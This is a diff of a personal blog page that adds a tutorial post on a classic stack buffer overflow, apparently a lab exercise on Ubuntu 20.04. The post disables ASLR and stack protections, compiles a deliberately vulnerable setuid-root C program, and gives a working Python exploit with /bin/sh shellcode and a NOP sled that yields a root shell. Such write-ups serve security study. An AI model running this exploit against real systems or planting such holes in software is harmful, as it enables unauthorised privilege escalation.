@@ -1,7 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
-	<meta name="generator" content="Hugo 0.79.0" />
     <meta charset="utf-8">
     <meta name="HandheldFriendly" content="True">
     <meta name="MobileOptimized" content="320">
@@ -16,10 +15,10 @@
     <title>
       
       
-         Before Dawn 
+         Buffer overflow attack 
       
     </title>
-    <link rel="canonical" href="https://chuang76.github.io/">
+    <link rel="canonical" href="https://chuang76.github.io/posts/bof/">
 
     <style>
   * {
@@ -409,7 +408,6 @@
 </style>
 
 
-    <link rel="alternate" type="application/rss+xml" href="https://chuang76.github.io/index.xml" title="Before Dawn" />
     </head>
 
   <body>
@@ -422,130 +420,130 @@
 
 
 <section id=content>
-  <ul class=posts_listing>
+  <h1> Buffer overflow attack </h1>
+
+  
+    <div id=sub-header>
+      January 2021 
+    </div>
+  
+
+  <div class="entry-content">
+    <p>The goal of the following experiments is to exploit buffer overflow attack and get the root privilege of the shell.</p>
+<h2 id="setup">Setup</h2>
+<p>Environment:</p>
+<ol>
+<li>Google cloud virtual machine: Ubuntu 20.04</li>
+<li>Linux kernel version: 5.4.0</li>
+</ol>
+<p>Countermeasures:</p>
+<ol>
+<li>ASLR (address space layout randomization) provided by the operating system</li>
+<li>NX/DEP bit provided by the hardware architecture</li>
+<li>StackGuard or canary mechanism provided by the compiler</li>
+</ol>
+<p>Check if ASLR is activated or not (default is 2):</p>
+<pre><code>$ cat /proc/sys/kernel/randomize_va_space 
+2
+</code></pre><p>Disable ASLR:</p>
+<pre><code>$ sudo sysctl -w kernel.randomize_va_space=0
+kernel.randomize_va_space = 0
+</code></pre><p>In the most recent Ubuntu operating systems, the /bin/sh points to the /bin/dash. Dash can prevent itself from being executed in a Set-UID process since it detects if the effective UID equals to real UID or not. More details about dash history can be found <a href="https://bugs.launchpad.net/ubuntu/+source/dash/+bug/1215660">here</a>.</p>
+<pre><code>$ cd /bin &amp;&amp; ls -l | grep &quot;sh&quot;
+lrwxrwxrwx 1 root   root            4 Jan 29 23:22 sh -&gt; dash
+</code></pre><p>So we use another shell called zsh that does not have such a security countermeasure.</p>
+<pre><code>$ sudo ln -sf /bin/zsh /bin/sh
+</code></pre><h2 id="vulnerable-program">Vulnerable program</h2>
+<p>Here is a vulnerable program. It reads something from a file called badfile, then copy the content into the buffer. The program (the function strcpy()) does not limit the input from the user, so we can exploit this vulnerability. That is, we can make the program crash or execute some malicious code with buffer overflow attack.</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+#ifndef BUF_SZ 
+#define BUF_SZ 100
+#endif 
+
+int bof(char *str)
+{
+    char buffer[BUF_SZ]; 
+    strcpy(buffer, str);        // buffer overflow attack 
+    return 1; 
+}
+
+int main(int argc, char** argv)
+{
+    char str[517]; 
+    FILE* badfile; 
+
+    badfile = fopen(&quot;badfile&quot;, &quot;r&quot;); 
+    fread(str, sizeof(char), 517, badfile);     // read contents from badfile
+    bof(str);                                   // copy to the buffer
+    printf(&quot;Return properly\n&quot;); 
+
+    return 1; 
+}
+</code></pre><p>Compile the vulnerable program as follows, the flag &ldquo;-z execstack&rdquo; means to make the stack executable (since stacks are non-executable by default) and &ldquo;-fno-stack-protector&rdquo; means to disable the StackGuard protection.</p>
+<pre><code>$ gcc -DBUF_SZ=100 -m32 -g -o stack-dbg -z execstack -fno-stack-protector stack.c
+$ sudo chown root stack
+$ sudo chmod 4755 stack 
+</code></pre><pre><code>$ ls -l | grep &quot;stack&quot;
+-rwsr-xr-x 1 root ychin_chuang 15708 Jan 31 08:10 stack
+</code></pre><p>Use gdb debugger to figure out the distance between the buffer and return address. As you can see, the distance is 0xffffd2a8 - 0xffffd23c  + 4 (the size of ebp) = 112.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/ch2-1.PNG?raw=true" alt=""></p>
+<h2 id="payload">Payload</h2>
+<p>The shellcode in the following exploit program aims to execute &ldquo;/bin/sh&rdquo;. We can use NOP-sled as a strategy to hit the start of our shellcode. NOP (0x90) means do nothing in the CPU instruction, so we can just slide in the buffer until reach the shellcode. Note that <code>ret</code> is 0xffffd2a8 plus some number. That is because the gdb pushes some environment data into the stack before running the program. Since the stack grows downwards in x86 processors, the actual frame pointer without debugging mode will be larger than 0xffffd2a8.</p>
+<pre><code>#!/usr/bin/python3
+
+import sys 
+shellcode = (
+        &quot;\x31\xc0&quot;
+        &quot;\x50&quot;
+        &quot;\x68&quot;&quot;//sh&quot;
+        &quot;\x68&quot;&quot;/bin&quot;
+        &quot;\x89\xe3&quot;
+        &quot;\x50&quot;
+        &quot;\x53&quot;
+        &quot;\x89\xe1&quot;
+        &quot;\x99&quot;
+        &quot;\xb0\x0b&quot;
+        &quot;\xcd\x80&quot;
+    ).encode('latin-1')
+
+# fill with NOPs 
+content = bytearray(0x90 for i in range(517))
+
+start = 517 - len(shellcode)
+content[start:] = shellcode
+ret = 0xffffd2a8 + 120     
+offset = 112 
+L = 4                       # 32-bit 
+
+# modify the return address
+content[offset:offset+L] = (ret).to_bytes(L, byteorder='little')
+
+with open('badfile', 'wb') as f:
+    f.write(content)
+</code></pre><h2 id="launch-the-attack">Launch the attack</h2>
+<pre><code>$ rm badfile
+$ python3 exploit.py 
+$ ./stack 
+# whoami 
+root 
+</code></pre><p><img src="https://github.com/chuang76/image/blob/master/ch2-2.png?raw=true" alt=""></p>
+
+  </div>
+
+  <div id=links>
     
-      <li>
-        <h2><a href="https://chuang76.github.io/posts/bof/">Buffer overflow attack</a></h2>
-        <div class=date>
-          
-            January 2021
-          
-        </div>
-      </li>
+      <a href="https://chuang76.github.io/posts/nebula_p4/">&laquo;&nbsp;Writeup: nebula (level 10)</a>
     
-      <li>
-        <h2><a href="https://chuang76.github.io/posts/nebula_p4/">Writeup: nebula (level 10)</a></h2>
-        <div class=date>
-          
-            December 2020
-          
-        </div>
-      </li>
     
-      <li>
-        <h2><a href="https://chuang76.github.io/posts/nebula_p3/">Writeup: nebula (level 6 - level 8)</a></h2>
-        <div class=date>
-          
-            December 2020
-          
-        </div>
-      </li>
-    
-      <li>
-        <h2><a href="https://chuang76.github.io/posts/nebula_p2/">Writeup: nebula (level 3 - level 5)</a></h2>
-        <div class=date>
-          
-            December 2020
-          
-        </div>
-      </li>
-    
-      <li>
-        <h2><a href="https://chuang76.github.io/posts/nebula_p1/">Writeup: nebula (level 0 - level 2)</a></h2>
-        <div class=date>
-          
-            December 2020
-          
-        </div>
-      </li>
-    
-      <li>
-        <h2><a href="https://chuang76.github.io/posts/shellshock/">Writeup: shellshock</a></h2>
-        <div class=date>
-          
-            December 2020
-          
-        </div>
-      </li>
-    
-      <li>
-        <h2><a href="https://chuang76.github.io/posts/users_and_groups/">Users and Groups</a></h2>
-        <div class=date>
-          
-            December 2020
-          
-        </div>
-      </li>
-    
-      <li>
-        <h2><a href="https://chuang76.github.io/posts/mistake/">Writeup: mistake</a></h2>
-        <div class=date>
-          
-            December 2020
-          
-        </div>
-      </li>
-    
-      <li>
-        <h2><a href="https://chuang76.github.io/posts/leg/">Writeup: leg</a></h2>
-        <div class=date>
-          
-            December 2020
-          
-        </div>
-      </li>
-    
-      <li>
-        <h2><a href="https://chuang76.github.io/posts/input/">Writeup: input</a></h2>
-        <div class=date>
-          
-            December 2020
-          
-        </div>
-      </li>
-    
-      <li>
-        <h2><a href="https://chuang76.github.io/posts/passcode/">Writeup: passcode</a></h2>
-        <div class=date>
-          
-            December 2020
-          
-        </div>
-      </li>
-    
-      <li>
-        <h2><a href="https://chuang76.github.io/posts/payload/">Walkthrough: payload</a></h2>
-        <div class=date>
-          
-            December 2020
-          
-        </div>
-      </li>
-    
-      <li>
-        <h2><a href="https://chuang76.github.io/posts/lazy_binding/">Lazy binding</a></h2>
-        <div class=date>
-          
-            December 2020
-          
-        </div>
-      </li>
-    
-  </ul>
+  </div>
 </section>
 
   
 </body>
 </html>
+
 
 
